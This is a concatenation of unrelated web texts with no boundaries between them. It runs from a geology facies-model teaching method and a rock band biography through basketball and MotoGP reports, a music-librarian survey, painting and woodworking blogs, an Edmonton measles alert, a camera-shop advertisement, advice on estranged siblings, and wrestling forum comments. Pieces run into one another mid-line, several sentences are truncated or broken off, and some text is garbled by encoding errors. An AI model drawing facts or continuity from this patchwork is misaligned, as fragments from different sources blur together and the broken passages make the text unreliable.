Step 1: Each facies model is introduced through an in-class discussion, during which the instructor guides students toward an understanding of basic concepts, such as energy regimes and the nature of boundaries (surfaces) between these regimes, as well as likely sediment characteristics, structures, and transport processes and directions. These items are outlined on a black- or white board as they are discussed. Though the shoreface system is used as an example in this document, a similar approach can be applied to any depositional system.
Step 2: Students work in groups of three or four to draft a reasonable facies model consisting of a plan view and both depositional strike and dip cross-sectional views. Though they compare and contrast their models in groups, each student is, ultimately, responsible for his/her own final model.
Step 3: Students compare and contrast their models to those from published sources to try to understand differences between interpretations. Part of this is to emphasize that there is a range of correct interpretations and to not become locked into thinking there is a single "correct" solution.
Step 4: Students prepare a final draft of their model, along with a written outline of how they would present/explain the model to others. This is submitted for a grade.
Step 5: Three models (two clastic and one carbonate) are chosen from the nine discussed in class for inclusion on an exam. Students reproduce their models and, in narrative form, flesh out their outlines. To avoid rushing them on the exam, I make it available over a three day time frame and allow them to come to my office when ready.

Days of the New is a post-grunge rock band from Charlestown, Indiana. The band formed around 1995 and moved to Louisville, Kentucky. The band consists of Vocalist/Guitarist/Songwriter, Travis Meeks and a variety of supporting musicians. They are best known for the hit singles "Touch, Peel & Stand" and "The Down Town", both from their self-titled debut album.
Days of the New I

Three songs from this album were hits: "Touch, Peel & Stand", "The Down Town" and "Shelf in the Room". "Touch, Peel & Stand" was number one modern rock track on Billboard's Rock Chart for a record 17 weeks. "The Down Town" and "Shelf in the Room" were both top 40 hits as well. moniker.
Days of the New II
Just one year after the original band's breakup, Meeks had assembled a new Days of the New and recorded a second album. Titled "Days of the New II" and is also known as Green. This album was released in 1999 and had a variety of different styles of music. Many of the album's songs contained intros and codas to seamlessly carry into the next song. This album includes a full orchestra as well as backing vocals from The Pussycat Dolls front woman, Nicole Scherzinger.
The album sold around 600,000 copies. "Enemy," was a major hit and the 2nd single, "Weapon and the Wound", failed to match its predecessor.
Days of the New III
After touring to support the band's second album, Meeks returned to the studio with a new band. called "Days of the New III", or Red.

Travis Meeks has gone on to many individual projects; he contributed to the Doors tribute album Stoned Immaculate: The Music of the Doors as lead vocalist on a cover of "The End". After appearing on an episode of A&E's Intervention, where his family and friends convinced him to seek help for his addiction to crystal meth. Meeks entered rehab and is now sober.

Starting point guard Anthony Hickey and two other players have left the LSU basketball program, Tigers coach Johnny Jones announced Tuesday.
Hickey, a 5-foot-11 junior from Hopkinsville, Ky., who has started 85 games over the last three years, averaged 8.4 points per game last season for the 20-14 Tigers. He was fifth in the SEC in assists (126) and led the conference in assist-to-turnover ratio (2.8).
Also leaving the program are sophomores Shane Hammink and sophomore Malik Morgan.
"These three players will not be a part of the LSU program next season," Jones said in a release. "We thank them for the contributions they made to the LSU basketball team and certainly wish them well in their future plans."
Hammink, a 6-7 forward from the Netherlands, played in 21 games this past season and in 47 games in his two years at LSU, posting career averages of 1.6 points and 1.4 rebounds.
Morgan, a 6-4 guard from River Ridge, La., played in 52 games with 20 starts. He averaged 4.9 points and 3.0 rebounds. He was sidelined by a knee injury and surgery after the Tigers' Feb. 8 game against Auburn.In addition to the information contained in the Preliminary
report, we examined the following questions using data from
the survey. We examined responses from MLA national members
only. These questions and their answers were discussed during
the WG session in Boston.
These questions are couched in terms of hypotheses
and statistically significant responses. By "statistically
significant" or "statistically significant difference"
we mean that, according to the statistical test used, these results
would happen by chance at most only 5 times in 100. The actual
numbers from the tests (run in SPSS) are not listed here for reasons
of space. They will be included in the final report of the Working
Group.
In looking at job categories (reference librarian, cataloger, administrator) we considered someone to belong to a particular category if 50% or more of their time was spent on those activities. These categories were mutually exclusive-for example, no one spending 50% or more of their time on cataloging also spent 50% of their time doing reference or administrative work. In considering salaries, we used only salaries of those who had full-time work.
Please note: These results are preliminary and may change as we reexamine the data. Hence do not consider them as the last word on these particular issues.
Hypothesis: Reference librarians and administrators are more likely to have a graduate degree in music than catalogers.
No statistically significant differences were
found. All three groups are equally likely to have music graduate
degrees.
Hypothesis: Public librarians and academic librarians are equally likely to have graduate degrees in music.
Those working in academic libraries are more likely
to have graduate degrees in music. (This result is statistically
significant at the .05 level) This is one of the few areas in
which public and academic librarians differ.
Hypothesis: Administrators are more likely than catalogers or reference librarians to publish articles, reviews, or books, and academic librarians are more likely to publish than are public librarians.
Actually, there are no statistically significant
differences between any of these groups with regard to scholarly
activity save that administrators are more likely to author or
co-author books than reference or catalog librarians.
Hypothesis: Male MLA members are more likely than female MLA members to publish, perform, etc. etc.
In general, there are no statistically significant
differences between men and women regarding scholarly activity.
Hypothesis: Women are more likely than men to serve on the MLA board, chair a committee, be appointed to a committee . (etc.)
There are no statistically significant differences
when comparing gender to participation in any of the MLA activities
we measured.
Hypothesis: There are differences between public librarians and academic librarians in MLA participation.
None we have yet discovered. There are no statistically
significant differences when comparing participation in specific
MLA activities to the type of library (academic vs. public) in
which MLA members worked.
Hypothesis: You are more likely to be elected to the board if you are from the Northeast.
We did not find that MLA members from northeastern
states were proportionally more likely to be elected to the board
than MLA members from the rest of the country. Note also that
there appears to be no statistically significant relationship
between board membership and the possession of an MLS or a graduate
degree in music.
Hypothesis: Male MLA members earn more than female MLA members.
There appears to be no statistically significant
difference between the average salary of men and women employed
full-time who are MLA national members. This holds true for the
few subgroups we looked at as well (e.g. those with an accredited
MLS).
Hypothesis: Surely administrators earn more than reference librarians or catalogers.
Yes. The average salary of those spending half
or more of their time on administrative work is greater than that
of reference or catalog librarians, and this difference is statistically
significant.
Hypothesis: Public librarians earn more than academic librarians.
There does not appear to be a statistically significant
salary difference between these two groups.
Hypothesis: There are statistically significant differences in job satisfaction measures between men / women, academic / public librarians, or catalogers / reference / administrators.
In general, apparently not, but this area needs
more research. It seems, however, that there are no gender-related
or library-related differences on any of the individual measures
of job satisfaction.
Hypothesis: Women are more likely than men to make changes in their job or education due to family responsibilities.
Yes, but (because of small cell sizes) the only
significant differences are in 'resigned position to relocate
with spouse or family.' Most MLA members did not indicate family
responsibilities caused them to make changes in job or education.
These are some of the issues we have been able to
test statistically. Now we would like your help. Please have a
look at the full questionnaire. If there are specific questions
or groups of related questions or issues which you would like
us to research, please let any of the members of the working group
know. We will do our best to look at your questions or interests
and incorporate them into our final report.

Copy of Van Gogh's Fruit Field
A copy of Van Gogh's painting, but not in the color. I used blue tone here. I don't quite like the original greenish yellow.
I am always wondering how Van Gogh creates those curly stroke in his painting. I tried with brush, but couldn't get it right. I have those sticks for watercolor painting, somehow I try to use it and it gives me this curly lines of tree trunk, branches and texture in the ground fantastically.. I never expected that the watercolor sticks can be used in oil painting as well. Such a nice discovery.

Vintage Looking Digital Prints
I like the vintage looking photos. This is a print that I created using my photo with digital collages. I love the chinese character written by late Chairman Mao. His style is distinguishably unique.
I would love to have a print for my wedding (too bad I am already married) or bedroom decoration.

This painting is painted on a piece of acrylic treated watercolor paper so the oil won't seep into the paper as in normal case. As this is a heavy weight watercolor paper, the painting is hard and straight. It is easy to be framed.

High Sky and Little Houses
Starry Night
It's so fun to use thick oil in painting. This little house in the night makes a perfect painting using thick oil. I use the acrylic treated watercolor paper for this painting.
If you have spoiled a watercolor paper which is very often due to the characteristics of watercolor, don't through it away. You can coat it with acrylic and use it as oil painting paper.

I was thinking of using watercolor to do this piece, but later changed to oil. It's not easy to get the rich and dark color using watercolor.
With a baby at my house, I don't want to use oil very much because of the smell. But I like to paint in oil. I like the rich and bright colors.

Pink Bottle, Yellow Jar
I take the painting and did some digital transformation and it gives out a very interesting digital art, isn't?
Pink flower still life
The whole painting is inspired by the three pink flower in a glass jar. I created the busy table with objects borrowed from other places.
I'd like to use neutral colors and lines in my painting these days. It is very interesting to make a painting exciting by applying various levels of grays.

Pink Amaryllis
This is a semi-abstract still-life painting. I try to use lines in the work. I think I should go to learn some monotype techniques as I like using lines very much.
I start by placing some colors around the paper without exactly clear the type of objects they are. After that, I draw lines around them and it became clear to me the bottles and the flower. After that, I put more color so that the objects are in shape. It is a nice way to develop paintings as it is very spontaneous.

Mom Has No Diploma -- Can She Homeschool Me?
Q: I'm 16 years old, in tenth grade, and am badly harassed in school. My mom and I have talked about homeschooling, but she doesn't have a diploma, because she got pregnant and had to drop out. Do you need a diploma to homeschool your own child?
A: Many teens in your position have left school and successfully completed their education. You must read a book that has changed the lives of many teens in your shoes: The Teenage Liberation Handbook by Grace Llewellyn.

AMA Votes to Reschedule Medical Marijuana
AMA Report Recognizes Medical Benefits of Marijuana, Urges Further Research

Houston, TX -- The American Medical Association (AMA) voted today to reverse
its long-held position that marijuana be retained as a Schedule I substance
with no medical value. The AMA adopted a report drafted by the AMA Council

Medicinal Purposes," which affirmed the therapeutic benefits of marijuana

Pain Contracts: "Cooperation" or Coercion?
â€œPain contractsâ€ are signed agreements between a patient and a doctor specifying the terms and conditions under which the doctor agrees to treat a patient's chronic pain with opioid medications. These contracts typically include provisions which require patients to comply with the doctor's treatment recommendations, submit to random drug screening, refrain from the use of alcohol or illegal drugs, and keep their appointments. These contracts also usually specify that a patient may be discharged from the doctor's care or denied further treatment for any violation of the agreement.

At Tightrope they had stacks of shirred maxi dresses for $10. I wanted a top that had shirring on the hips so I bought a maxi dress that had shirring around the bust, cut it in half, turned it upside down and then created the neckline and armholes.
The shirring is now on my hips.
I played with the armholes a bit to make sure you couldn't get a side view of what's beneath the top. My cousin's who know I'm a dag, found it amusing. Maybe I've now got some design cred? The left over fabric will be used for a top shortly.

Beautiful, you did an amazing job...
Thank you.Just to break from the “royal we” for a moment, your correspondent on this story is, in fact, an avid juggler. Juggling is like nerd herpes, once you catch it, you carry it around for life. So I understand the desire of Jordan Goldklang, aka Jordini, to make something that takes long hours, hard practice, and offers absolutely zero reward unless you enjoy being on cruise ships and street corners a heck of a lot, into a degree, because at least he’ll have something to show for all that time he spent not talking to girls. But dude, Jordan, seriously, a magic major? Come on man. I’ve got a theatre degree, for God’s sake, probably the least employable major on the planet unless you have blackmail photos of website editors incredible writing talent and huge reserves of charm.
If you’re wondering how Goldklang got away with this, no, he didn’t hypnotize school administrators (although we’re not ruling out blackmail). It’s courtesy of the individually designed major program at Indiana University, and we’re sure IU is very proud, and no doubt working on a way to make scholarships refundable. If you live in Indiana, you can catch Jordan at the Bloomington TGI Friday’s, no doubt a preview of his future career.
[Thanks to Eibmoz for the tip.]
He just made himself disappear from his parents’ wills.
By the time he graduates, he should be able to pull his virginity out of his hat.
The Amazing Jordini pays his rent with gold coins that he found behind people’s ears.
Pretty sure “Bachelor of Magic” is going to be an applicable term for a long time.
During his show at TGI Friday’s the deep fryer in the back magically loses it’s attendant.
They’re called illusions Jordan, cmon!

'From a public health perspective we feel kind of sad because this is preventable. It is completely preventable.'- Dr. Marcia Johnson, Edmonton's medical officer
"We have recognized a case in a child who was travelling from the Philippines to Vancouver and then on to Edmonton," said Dr. Marcia Johnson, Edmonton's medical officer, at a press conference Saturday afternoon.
Passengers and crews on Air Canada flight AC 248 departing from Vancouver at 8:30 p.m. on April 9 and arriving in Edmonton at 9:35 p.m. may have been exposed, Alberta Health Services said in a release earlier on Saturday.
People who were at the Edmonton International Airport between 9:35 p.m. on April 9 and 2 a.m. on April 10 may also be at risk, AHS said.
Those who have not already had measles or those who have not been vaccinated may be at risk, AHS also said.
They are advised to monitor themselves for symptoms of measles, which include:
- Fever of 38.3 C or higher.
- Cough, runny nose and/or red eyes.
- A red, blotchy rash that appears three to seven days after fever starts, beginning behind the ears and on the face and spreading down the body and then to the arms and legs.
Those who notice possible symptoms are asked to stay home and call Health Link Alberta at 1-866-408-5465 before visiting a clinic.
'Extremely contagious'
Johnson said she couldn't release information about the age of the child, or if the child was a resident or a visitor to Canada.
The child didn't require hospitalization and is now recovering at home, according to Johnson.
She also.
"Measles is extremely contagious. It spreads through the air. You just have to be walking through an air space where a person with measles has walked through within two hours and you can be exposed to measles," Johnson told reporters.
"Every single measles case that develops is a spark to expose other people."
There is no treatment for the disease, but it can be prevented through immunization, AHS said.
15 cases in Alberta.
Saturday's confirmation is the second case of measles in the Edmonton area this year. The first case of measles was confirmed earlier this month and AHS is asking people who visited two west Edmonton businesses in late March to watch for symptoms.
The confirmation brings the total cases of measles in Alberta.Join us for future Interactive chats with observers, analysts and officials regarding the crisis in Colombia. Meanwhile, transcripts of previous chats are available on this page.

This short film is the second part of an Emmy-award-winning, collaborative and interactive "documentary experiment" between the National Film Board of Canada and Op-Docs, the New York Times editorial department’s forum for short, opinionated documentaries. The entire Highrise project spans 2,500 years of vertical living around the world and highlights the social inequalities that rose up among the bricks and mortar. Beginning with "Mud" and ending with "Glass," director Katarina Cizek drew on The New York Times's vast photo archives to tell the story of the highrise and its impact on social history. Part four, entitled "Home," is made up of images submitted by the public, who are invited to explore the documentary's themes further by clicking around the project's main site here. Toronto's Helios Design Labs has served as the project's "house band" throughout its various iterations online, which includes the creation of "One Millionth Tower," the world’s first HTML5/WebGL short film built entirely in code.Bath time has as not only become a favorite bedtime ritual in our home, but I also love how bath time relaxes my baby.

To fill in a few minor points... 3Com had a (mostly user-level) TCP/IP for Unix, called UNET; it was certainly available in 1982 but not, I think, much earlier. BBN did a kernel implementation that was apparently ancestral to the 4.2bsd Berkeley version. I seem to recall a TCP (or was it NCP) for PDP 11-based Unixes around then, too. As for MVS -- there was no notion of a "directory". File names had levels, but these were separated by periods. Creating a new level in the "system catalog" (as opposed to a reference that also required you to specify the disk drive type and "volume serial") required a moderately arcane operation, much less common than mkdir. The notion of treating a level as a file would have been quite foreign; the catalog was not part of the disk in anything like the way it is on Unix. I don't know when Multics came online; I know that I used it via the ARPAnet in the (northern hemisphere) summer of 1976. --Steve Bellovin,Thursday, 20 September 2012
Forgiveness and Gratitude
You have to really want to let go to be able to fully forgive your past. People say they have 'Let Go' but you can probably bet your bottom dollar that 85% have not 'Let Go', the percentage is high, but it's true to it's number.
Forgiveness may come in many colours but you can't fake this emotion, because your heart can't fake gratitude, it can't fake forgiveness, it has to be 100% ready to release whatever it was, to stand in your own moment and say 'hey a most of the time it, 'I always meet asshats' then the universe will give you an abundance of asshats! if you affirm ', what ever works for you but let it go and feel the love, honestly it's the best way to move forward.
You can't control people or how their minds work, but you can control yourself, should they wish not to make you part of their future know its OK, you learnt all you could from the friendship/relationship, the universe will replace that with something bigger and better...... if you let it of course.
Bright Blessings

Pedrosa is now only 18 points behind the works Yamaha man who has increased his lead over Casey Stoner. The Australian, who cracked bones and tore ligaments in his ankle in a monster highside yesterday, was staring down the barrel of a podium until Andrea Dovizioso got the better of him with a handful of laps to go and you suspect that Stoner would have been in serious pain.
Lorenzo, who was one of only two prototype riders on the softer compound Bridestone, had no answer for Pedrosa’s pace and wasn’t helped when he got stuck behind Steve Rapp in the closing stages and he couldn’t find a way past the CRT wildcard.
Even though Lorenzo was fours second a lap faster, the American was quick through enough corners to cost the Yamaha man three seconds and he was given a waved leg as Lorenzo forced his way through with two laps left.
Team-mate Ben Spies had a second machine failure in as many races when his YZR-M1 let go on the start/finish straight as the Texan sat in second place. It added insult to Laguna Seca injury after his rear suspension brokes at the bottom of the Corkscrew. Spies’ engine was reasonably fresh and had only done three session before it blew in spectacular style, forcing following riders to go around the smoke cloud.
Dovzioso, meanwhile, bagged his fifth podium of the year and pulls away from team-mate Cal Crutchlow in the title stakes as the British rider crashed unhurt on the entrance to the final corner and couldn’t continue. Stefan Bradl had to give best to Alvaro Bautista for fifth while Valentino Rossi came in seventh and 57 seconds behind the leader.
Yonny Hernandez won the CRT battle, finishing in ninth overall, with Aleix Espargaro and Ivan Silva behind him.

When you are
shopping for a new camera in Old Bethpage, you may want to consider purchasing a brand new DSLR camera. This type
of camera offers greater versatility and precision than a traditional
point and shoot model. When you bring a brand new DSLR camera home from
the camera shop, you will be amazed at the brilliance and quality of your
photographs. Here is a look at some of the great benefits of DSLR cameras.
Improved Image Quality
One of the main benefits of
DSLR cameras is that these types of cameras offer improved image quality. A DSLR camera
contains a large light sensor, which allows the camera to take in a great
deal of information about the scene that you are shooting. Additionally,
this sensor ensures that there is very little noise, or grain, in your
final photograph.
Better Control
By purchasing a DSLR camera, you will gain better control over the final
product of your photographs. DSLR cameras allow you to adjust the shutter
speed and aperture for each shot. These settings make it so that you can
tune the focal area and lighting to your preferences. In addition, higher
shutter speeds will allow you to take action shots.
Fantastic Versatility
Overall, a DSLR camera will provide you with fantastic versatility for
all of your photography endeavors. For example, your DSLR camera can be
outfitted with a variety of different lenses. With a telephoto lens, you
will be able to take sharp images from very far away.
As you are shopping for DSLR cameras, be sure to make a trip to
Camera Land. We provide New Bethpage and the entire NYC area with a terrific inventory
of quality cameras, binoculars, and other great products. To learn more
about how we can help you purchase the brand new camera of your dreams,
give our New Bethpage location a call at (347) 329-4375.

Chief Justice John G. Roberts wrote the decision overturning a part of the Voting Rights Act.
RE “COURT voids a vital part of ’65 Voting Act” (Page A1, June 26)
The decisions rendered by the Supreme Court this week convince me that the court is as dysfunctional as the legislative branch. Neither the majority decision concerning the Voting Rights Act nor the Defense of Marriage Act were based on matters of law: they were political decisions by highly partisan political appointees, dressed in legal language. This is most evident in the majority's dismissal of Justice Ruth Bader Ginsburg's eloquent and detailed dissent in the voting decision.
Yes, “we” (whether progressives or conservatives) win some, lose some — but the decisions are not judicial; they are entirely political. The present conservative majority is intent on ensuring that our democracy is well on its way to transition to an oligarchy, awash in corporate money and enforced by gerrymandered districts assuring a Republican House. There is no such thing any longer as settled law; anything can and apparently will be rewritten by a bare minimum of 5-4 as its members are replaced by one president or another.

Those anglers who participated in the April 21 Save Rodman Open Fishing Tournament will help send a right-back-at-you volley across the bow of Florida Defenders of the Environment, Florida Wildlife Federation and Earthjustice.
And you can help too, by making a donation to Save Rodman Reservoir. Go to to learn more.
The tournament is the only fundraiser of the year for Save Rodman Reservoir Inc. (SRR), a small band of volunteers who have served as the guerilla resistance against the power and money of the environmental movement since 1995.
“Rodman Reservoir has been sitting there for 40 years and I can’t, for the life of me, see why any level-headed person would want to get rid of it,” said Ed Taylor, SRR president, who adds that the blind ideology of these groups has been driving him crazy for 17 years.
“What the enviros are hung up on is [the belief] that Rodman is not natural, and so it needs to go,” he said. “But the capitol building in Tallahassee is built in the middle of what used to be woods. It’s not natural either. A lot of things are not natural.”
Rodman, built on the Ocklawaha River, is the last remnant of the ill-fated Cross Florida Barge Canal, which was halted in 1971, when it was only a third complete. It was a bad idea from the start, initiated during a less-enlightened time, when we also were allowing agriculture, development and industry to destroy Florida’s Lake Apopka, as well as pollute Lake Okeechobee and the Everglades.
For environmentalists, Rodman is a constant reminder of that era, and they want it gone. Period.
They are willingly blind to the fact that this 9,000-acre reservoir is the exception to the rule in our environmental blunders. Despite ourselves, we created a thriving, diverse ecosystem. For example, the St. Johns River Water Management District confirmed 115 bird species in the Rodman system, compared to 45 along the Ocklawaha River. Seventy-four were observed only at the reservoir.
And how do environmentalists respond to facts? With derision.
Charles Lee, director of advocacy at Audubon of Florida told this to the Orlando Sentinel: “There are probably more bird species at the Orange County landfill than at a natural river, but that does not make it a good thing.”
OK, Chuck, how about the fact that the district documented more than a dozen different types of habitat within the Rodman complex, including more than a mile of river and floodplain swamp? How does that compare to a landfill?
That doesn’t matter either, I’m sure. Nor does the fact that Rodman is one of the most popular outdoor recreation destinations in the state. Or the reality that its abundant aquatic vegetation absorbs nutrients, protecting the water quality of the St. Johns River downstream of the dam.
Well, how about Rodman’s ready availability as a water supply source, as Florida cities consider how they will meet demand in the not too distant future? Or what about the cost of destroying this popular, productive system?
None of that is important for the environmental zealots, who want what they want and likely see a chance to get it in the Obama administration. They have lots of friends in Washington, D.C., these days, which could facilitate their suit to force the U.S. Forest Service to destroy the dam because — they allege — it endangers manatees and shortnose sturgeon.
“I’ve never seen a shortnose sturgeon, and I don’t know of anyone who has,” Taylor said. “Taypayers paid $600,000 for manatee protection devices at the dam and locks, and not one has been harmed since.”
Of course, that doesn’t matter either. Nor did it matter in 2003, when the Florida Senate unanimously passed a bill to ensure the future of Rodman by making it a reserve, and the House followed with its approval by a vote of 92 to 26.
“Sixty-five environmental groups opposed it and so Gov. Jeb Bush vetoed it,” Taylor says. “That’s what we’re up against.”
And that’s why your help is needed.
If you’ve never been to Rodman, you need to go and see for yourself why it’s worth saving. Even better, plan on fishing next year’s fund-raising tournament. And be sure to take heavy tackle when you go.
“Rodman’s still a great fishery,” said the SRR president. “This was a banner year, too, with lots of 8- to 10-pound fish, along with some 12s and 13s.”
Whether it remains a great fishery in the years to come depends on SRR and the support it receives from anglers and others who are not blinded by ideology.- Food

Sochi 2014: 6 Olympics Party Ideas

Recent Posts by RobynsWorldAs the saying goes, you don't choose your family. are especially tricky because they're the longest ones you have: You had your sibling before you had friends, a spouse or kids, and you'll have them after your parents die."
Despite our shared memories, or perhaps because of them, sibling relationships can often be the most conflicted, says Dr. Lewis. "Siblings are caught in the perceptions and feelings they've had about each other since childhood, and this can lock people into roles that might not be accurate anymore." The selfish sister who constantly puts herself first. The bossy brother who always tries to run the show. The rebel who will never be responsible…and so on.
Diane Brodie, 53, of Franklin Lakes, New Jersey, knows firsthand how dangerous those sibling minefields can be. "My older sister was the straight-A good girl and I was the free spirit," she says. "Yet, despite that, my mother always seemed to favor me, and I think my sister may have resented our special bond."
That, plus a six-year age difference, meant the two were never close growing up. But deep down, Diane always thought their relationship would change as they got older, becoming one of friendship and mutual respect.
Over the years, however, as the two forged completely different lives as adults—Diane becoming a divorced, successful entrepreneur, her sister a loving wife and mother—Diane's sister remained distant. "When she got engaged I was extremely happy for her," recalls Diane. "I was looking forward to sharing in her special day." Given the occasion, Diane thought her sister would feel the same way and ask her to be her maid of honor for the wedding. But she asked one of their cousins instead—a slight made all the worse because it would be so public. "Even though we weren't close, I thought she would still want me to stand up for her, because that's what sisters do. That really hurt me."
The snubs continued, despite Diane's repeated attempts to connect. She made it a point to visit her sister and her family often, including holidays, birthdays and during special events, even though her sister never reciprocated the visits. "I was the one doing all of the work, always," Diane says. "What's worse, every time I'd go see her and her family, it would be all about them. She never asked me about my life or my work, even after I started my own business, which is something I was really proud and excited about. After a while, that kind of indifferent treatment makes you feel like you just don't matter."
Diane finally decided to stop reaching out. "I never tried to talk to her about how I felt. I guess I just didn't see the point anymore since that was the way she'd always behaved toward me."
Although it's not healthy to hold on to someone who is hurting you, not even a relative, Dr. Lewis warns against giving up too soon, because there's always a possibility that the person will change in the future. "Even if you never want to see her again in that moment, you need to talk it out," she says. "Make sure you have tried everything before you let go, even counseling. If your family member continues to be demeaning, you can say, 'I don't think it's in my best interest to talk to or see you right now.' But you should leave the door open, because when you're not connected to your blood ties you often feel lost and untethered. Everything about who we are stems from our families and our shared history."
If you do want to reach out to her at some point, try writing a letter or email. "Confronting an estranged relative is far more emotionally charged, anxiety-ridden and guilt-producing than with an estranged friend," explains Susan Forward, PhD, author of Emotional Blackmail. "You're addressing deep-rooted issues that often date back to your childhood and those emotional triggers can trip you up." That's why writing is preferable to a face-to-face confrontation, because it allows you to calmly think of what you want to say without being defensive. "Letters or emails are powerful because you can't be interrupted or disagreed with," she adds. "It's easy to get upset and lose your train of thought if you're speaking to the person directly."
Once the letter has been sent, don't follow up, she adds. "You've said your piece. Now it's up to the recipient to respond." And if you get no reply? "Then that's your answer. There's nothing else you can do."
Although Diane hadn't seen or spoken to her sister in 10 years, two years ago she decided to reach out to her one last time. "I sent her an email telling her I loved her and always would, and suggested that email might be a good way for us to stay in touch," recalls Diane. "My sister thanked me for the note, said she agreed and that I was welcome to visit anytime. To me, that response felt like nothing had changed: It would still be me doing all the work. So I haven't visited. Things may never change between the two of us, but I feel as though by reaching out I made peace with whatever relationship we do have going forward."

Always wanted to replace the purely average clock on our fireplace mantle. Mechanical movement (8-day windup) is from Klockit. The case design and plans are my own (for better or for worse). Case is solid cherry with lacewood and curly maple inlays. Finish is boiled linseed oil followed by 4 or 5 coats of Formsby’s oil/varnish and a coat of wax. I don’t recommend climb cuts on a router table with small parts (like say, the door to a clock case) – I spent about a week repairing the damage caused by me losing control during one of those cuts.

For the crown and base, I used a carving punch – its about the size of a small pen with the business end dimpled. Just whack it with a hammer, shift it over, repeat. Took about an hour for each (top and bottom)

Speakers on Monday remembered Kevin Quick as a dedicated, unflappable veteran of Waynesboro's Reserve Police Force and a "kind and gentle" man with a ready smile.
The memorial at John Paul Jones Arena was attended by dozens of police officers, his chief and former law enforcement colleagues and Attorney General Mark Herring and Brian Moran, the secretary of the state's Department of Public Safety. He was also representing Gov. Terry McAuliffe.
Six people have been charged in connection with Quick's disappearance Feb. 1, but no one has been charged in his death.
State police have not said how Quick died. They say some of the six will face additional charges.Originally Posted by replacethebass
Sorry but I have to disagree. While I do think he can go in the ring his persona is a bit....... zzzzz, sorry where was I? Bland is the word that springs to mind, bland enough that I don't think there are a lot of ADR haters out there, simply a lot of people who have absolutely no interest in anything he does or says. His ring announcer has more character and charisma than he does, hell even the cars he drives to the ring are more entertaining.
All of this. 100%.
It's not that people are "hating" on Del Rio. They simply see him as a waste of space and air time. It's like, no matter how hard he tries, or how much WWE wants to push him in our face and make us care, we DON'T. And, a lot of that is due to his putrid promo skills. He's TERRIBLE on the mic. And when "talking fans into the arena" is your main objective, lacking mic skills is a HUGE problem.
Alberto's one of those guys that could benefit from having/leading a stable. Obviously he's not HHH or Ric Flair, but the idea of him being champion with two or three other guys always helping him win by cheating, is one I can see working. It might make the fans care a bit more, even if only due to his under-handed tactics. But Alberto by himself is bland and boring. I didn't miss him AT ALL during his injury, and wasn't excited to see him back. I actually preferred Dolph Ziggler taking his spot last month. Even as a heel, people like him. ADR, not so much. The guy has the charisma of a dead goat. WWE: Stop forcing him down our throats! Push someone else.
Del Rio needs to be repackaged, but as a heel. Look at what happened to Sheamus when he turned face. He's funny as hell with his little stories he likes to tell, but he lost so much passion in the ring. He was a frickin' menace. Del Rio could be too. I personally love the idea the person has on this site about Ricardo being the Keyser Soze behind Del Rio. That could be a great way to put Del Rio over as a face if you wanted to.
The main thing Del Rio needs is a legit finisher. I HATE the arm bar and would love to see something that looks more devastating than a guy humping another man's arm.
I like ADR but there's something that's clearly missing. A piece of the puzzle is missing. I remember when everyone was on his nuts when he came in... it's funny how things change huh?
first off, if ADR "stole" JBLs gimmick, then JBL stole it from Ted Dibiase, who probs stole it from someone in the NWA before most of us were born. so its time to stop making that comment.
second, don caras (adr's old man) and his uncle mil mascaras are GODs in mexico, so of course the mexicano population would pop for ADR. mexicanos are also VERY smart wrestling fans and can respect him for the in ring work, while US fans cheer for someone as untalented in ring as Sheamus.
the money gimmick is always a heel, it makes no sense to turn him face...

Damas y caballeros isn't random spanish, it means ladies and gentleman. Sorry you don't understand spanish. I don't know if your racist or just ignorant
I liked your blog. Don't agree with all of it but there is nothing wrong with that. ADR is excellent in the ring but his gimmick is a dud. Ted DiBiase Sr. did it better. ADR and the "Million Dollar Mexican" gimmick is just to meh.
The comments about a face ADR are interesting. If they could build towards that it could get interesting. If things stay status quo I don't think he will go anywhere.
Ricardo is total money though. His feud with Santino could be comedic gold.
Great blog! I couldnt agree more. I love ADR's persona, entrance and in ring work. I think he's great. I think he should actually sit down and watch some of the ring psychology that Jake Roberts or Larry Zbyszko had. Even JBL to an extent. I'm thinking the backlash against him is similar to what I used to have against HBK in the mid-90s. Honestly, I thought he was annoying and got easy heel heat with his incredibly lame promos (at least up until his WM14 promos). But, after that match at WM14, I finally saw the light and became a huge fan of his. My guess is that there are sooo many people blinded by how good of a job Del Rio is actually doing. The guy is 10x more interesting / entertaining than Randy Orton and he's considered one of the top guys in the WWE.2nd Trooper Suspended After Irving Cavity Search
IRVING (CBSDFW.COM) – The Texas Department of Public Safety has suspended a second state trooper in connection with the controversial roadside body cavity search of two women in Irving. The incident was caught on the trooper’s dashcam video.
Texas DPS said that it suspended state trooper David Ferrell with pay on December 21. The department had already suspended female state trooper Kelley Helleson, who conducted the actual search of the women.
Angel Dobbs, 38, and her 24-year-old niece filed a federal lawsuit against the two troopers and Texas DPS director Steven McGraw. The women claim that, last July, Ferrell pulled them over for throwing cigarettes out from their car. Ferrell claimed that he smelled marijuana in the car, the women said, and called for Helleson to come search the women at the scene.
Dashcam video shows Helleson putting on gloves before pulling down the women’s pants to conduct a search. Dobbs said that they were violated by the trooper.
The women filed a complaint last fall, and Texas DPS had the Texas Rangers investigate the allegations. The Rangers sent their findings to Dallas County prosecutors. A county grand jury will now consider the case this month.

Updated: Tuesday, 01 Apr 2014 16:31 | Comments
Munster may have to plan without Donnacha Ryan for their Heineken Cup quarter-final against Toulouse on Saturday, but expect their captain, Peter O’Mahony to be fit.
Ryan is still a major doubt following the foot injury that ruled him out of the Pro12 derby against Leinster last Saturday. His foot injury is recovering slower than was hoped for.
Munster are also monitoring the hamstring injury that meant O’Mahony was a last-minute absentee from the Leinster encounter.
O'Mahony took a limited part in training on Tuesday, and is expected to train fully on Thursday and be available for selection.
Damien Varley, Keith Earls and Tommy O'Donnell are all on curtailed training workloads but expected to be ready for the weekend.XM Satellite Radio Radio Shows

Oct. 24 (Bloomberg) -- Banning schools from the postseason if their players don’t reach a minimum graduation rate will be voted on this week by the National Collegiate Athletic Association’s Division I Board of Directors.
NCAA President Mark Emmert, speaking at a Knight Commission on Intercollegiate Athletics meeting in Washington, said the proposal to be considered on Oct. 27 requires an Academic Progress Rate of 900 and could be implemented as early as this season’s men’s basketball tournament. The rate would be increased to 930 -- the equivalent of a 50 percent graduate rate -- in 24 months.
Emmert said if the 900 proposal had been in place last season, the University of Connecticut would have been barred from the men’s basketball tournament that it wound up winning. The Huskies had an APR of 893, according to databases compiled by USA Today and the Associated Press.
“Most schools won’t notice this,” he said of the initial jump to 900. “If (the board) wants to go to 930 right now that’s fine, but there will be a lot of collateral damage.”
Emmert said he is trying to speed up the adoption of new rules to keep up with the changing college landscape.
“We need to act with some dispatch,” he said.
